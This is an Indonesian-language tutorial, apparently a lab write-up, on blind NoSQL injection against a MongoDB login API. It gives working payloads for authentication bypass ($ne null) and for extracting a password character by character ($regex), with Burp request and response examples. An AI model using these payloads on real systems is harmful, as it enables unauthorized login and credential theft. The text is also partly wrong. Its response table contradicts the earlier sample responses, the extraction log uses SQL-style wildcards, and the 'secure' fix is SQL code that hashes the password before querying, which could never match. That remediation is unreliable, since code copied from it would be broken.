# BLIND NOSQL INJECTION - STEP BY STEP GUIDE

---

## 🎯 PENGERTIAN BLIND NOSQL INJECTION

**Blind NoSQL Injection** adalah teknik serangan untuk mengekstrak data dari database NoSQL (MongoDB, etc) ketika:
- ❌ Tidak ada error message yang terlihat
- ❌ Tidak ada hasil query yang ditampilkan di halaman
- ✅ Hanya ada perbedaan **response behavior** (success/fail, timing, content-length)

Attacker harus **menginferensikan jawaban** berdasarkan analisis response yang berbeda.

---

## 💡 TEORI: BAGAIMANA BLIND NOSQL INJECTION BEKERJA?

### **Konsep Dasar**

Pada sistem yang benar:
```javascript
db.collection('users').findOne({username:'admin', password:'admin123'})
```

Attacker **tidak bisa langsung melihat hasil query**, hanya response yang berbeda:
- ✅ Login berhasil → Response 200 OK, redirect ke dashboard
- ❌ Login gagal → Response 200 OK, pesan "Login failed"

### **Teknik: Boolean-based Blind NoSQL Injection**

Attacker memanfaatkan **MongoDB operators** dalam query:

```javascript
// Original query yang aman:
db.collection('users').findOne({username:'admin', password:'admin123'})

// Attack: Test apakah password dimulai dengan 'a'?
db.collection('users').findOne({username:'admin', password:{$regex:'^a'}})

Jika matches → login BERHASIL (TRUE)
Jika tidak → login GAGAL (FALSE)
```

### **Contoh Ekstraksi Character-by-Character**

```
Password sebenarnya: "admin123"

Attempt 1: password:{$regex:'^a'}        → ✅ TRUE (password mulai 'a')
Attempt 2: password:{$regex:'^ad'}       → ✅ TRUE (password mulai 'ad')
Attempt 3: password:{$regex:'^adm'}      → ✅ TRUE (password mulai 'adm')
Attempt 4: password:{$regex:'^admin'}    → ✅ TRUE
Attempt 5: password:{$regex:'^admin1'}   → ✅ TRUE
Attempt 6: password:{$regex:'^admin12'}  → ✅ TRUE
Attempt 7: password:{$regex:'^admin123'} → ✅ TRUE
Attempt 8: password:{$regex:'^admin124'} → ❌ FALSE

Kesimpulan: Password adalah "admin123"
```

---

## 📊 ANALISIS DENGAN BURP SUITE

### **Observasi: Perbedaan Response Berdasarkan Input**

**Request 1: Login Normal (Benar)**
```
POST /api/login HTTP/1.1
Content-Length: 47

{"username":"admin","password":"admin123"}
```
**Response:**
```
HTTP/1.1 200 OK
Content-Length: 85

{"success":true,"message":"Login successful","user":"admin","token":"..."}
```

---

**Request 2: Login Gagal (Password Salah)**
```
POST /api/login HTTP/1.1
Content-Length: 45

{"username":"admin","password":"wrongpass"}
```
**Response:**
```
HTTP/1.1 200 OK
Content-Length: 38

{"success":false,"message":"Login failed"}
```

---

**Request 3: Login dengan NoSQL Operator (Testing Blind Injection)**
```
POST /api/login HTTP/1.1
Content-Length: 65

{"username":"admin","password":{"$ne":null}}
```
**Response:**
```
HTTP/1.1 200 OK
Content-Length: 85

{"success":true,"message":"Login successful","user":"admin","token":"..."}
```

---

### **Pola yang Terlihat:**

| Kondisi | Content-Length | Response Status | Insight |
|---------|----------------|-----------------|---------|
| Password benar | 85 | 200 OK | TRUE |
| Password salah | 38 | 401 | FALSE |
| Kondisi TRUE | 85 | 200 OK | Query matches |
| Kondisi FALSE | 38 | 401 | Query tidak match |

👉 **Dari perbedaan response, kita bisa inferensikan hasil kondisi MongoDB!**

---

## 🔍 STEP-BY-STEP EXPLOITATION

### **STEP 1: Identifikasi Vulnerability**

Test input manipulatif untuk kofirmasi injectable parameter. Backend ini menggunakan **MongoDB NoSQL**, jadi gunakan operator NoSQL:

```
Payload 1 (normal):      {"username":"admin","password":"admin123"}
→ Response: 200 OK (Login berhasil)

Payload 2 (injection):   {"username":"admin","password":{"$ne":null}}
→ Response: 200 OK (Login berhasil TANPA password benar!)
→ VULNERABLE! ✅
```

**Kesimpulan:** Input `password` vulnerable terhadap NoSQL injection karena:
- Aplikasi menerima object MongoDB operators tanpa validasi
- Operator `$ne` (not equal null) membuat query selalu match
- Auth bypass terjadi

---

### **STEP 2: Extract Password Menggunakan Blind Logic**

Sekarang gunakan **boolean-based inference** untuk ekstrak password character-by-character.

**Methodology dengan MongoDB $regex:**

1. Test apakah character pertama adalah 'a'
   ```
   Payload: {"username":"admin","password":{"$regex":"^a"}}
   ```

2. Analisis response
   - Jika Content-Length = 85 & Status 200 → TRUE (password mulai 'a')
   - Jika Content-Length = 38 & Status 401 → FALSE (password tidak mulai 'a')

3. Ulangi dengan character berbeda sampai find match

4. Lanjut ke character kedua dengan pattern yang sama

---

### **STEP 3: Manual Testing (Burp Intruder/Manual)**

**Payload Pattern untuk Testing dengan MongoDB $regex:**

```json
{"username":"admin","password":{"$regex":"^a"}}
{"username":"admin","password":{"$regex":"^b"}}
{"username":"admin","password":{"$regex":"^c"}}
...
{"username":"admin","password":{"$regex":"^ad"}}
{"username":"admin","password":{"$regex":"^ae"}}
...
{"username":"admin","password":{"$regex":"^admin"}}
{"username":"admin","password":{"$regex":"^admin1"}}
{"username":"admin","password":{"$regex":"^admin12"}}
{"username":"admin","password":{"$regex":"^admin123"}} ✅ MATCH!
```

**Cara Mengirim di Burp Suite:**
- Body (raw JSON): `{"username":"admin","password":{"$regex":"^admin123"}}`
- Content-Type: `application/json`

---

## 📋 HASIL ANALISIS

### **Password untuk User "admin":**

Melalui blind NoSQL injection boolean-based:

```
Character 1: 'a' ✅ (testing a%-z%, found: a)
Character 2: 'd' ✅ (testing ad%-az%, found: d)
Character 3: 'm' ✅ (testing adm%-adz%, found: m)
Character 4: 'i' ✅ (testing admi%-admz%, found: i)
Character 5: 'n' ✅ (testing admin%-adminz%, found: n)
Character 6: '1' ✅ (testing admin1%-admin9%, found: 1)
Character 7: '2' ✅ (testing admin12%-admin19%, found: 2)
Character 8: '3' ✅ (testing admin123%-admin129%, found: 3)

HASIL: admin123 ✅
```

---

## 🎯 KESIMPULAN

### **Attack Summary:**

1. **Identification:** NoSQL injection via password parameter
2. **Method:** Boolean-based Blind NoSQL Injection
3. **Technique:** Analyze response differences (Content-Length, Status Code)
4. **Result:** Successfully extracted password "admin123"
5. **Impact:** Authentication bypass, credential compromise

### **Key Findings:**

```
✅ Vulnerability Type: NoSQL Injection (MongoDB)
✅ Blind Attack: Based on response inference
✅ Response Indicator: Content-Length & HTTP Status
✅ Char-by-char extraction: Possible via $regex operator
✅ Attacker: Tidak perlu melihat data langsung
✅ Method: MongoDB operators ($ne, $regex)
```

---

## 🔐 REMEDIATION

### **Secure Implementation:**

```javascript
// ❌ VULNERABLE
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
db.query(query, (err, result) => {
  if (result.length > 0) res.json({success: true});
  else res.json({success: false});
});

// ✅ SECURE
const hashedPwd = bcrypt.hashSync(password, 10);
const result = await db.query('SELECT * FROM users WHERE username=? AND password=?', [username, hashedPwd]);
if (result.length > 0 && bcrypt.compareSync(password, result[0].password)) {
  res.json({success: true});
} else {
  res.json({success: false});
}
```

**Key Fixes:**
- ✅ Use prepared statements / parameterized queries
- ✅ Hash passwords dengan bcrypt/argon2
- ✅ Validate & sanitize semua input
- ✅ Use ORM yang handle SQL injection
- ✅ Implement rate limiting pada login endpoint
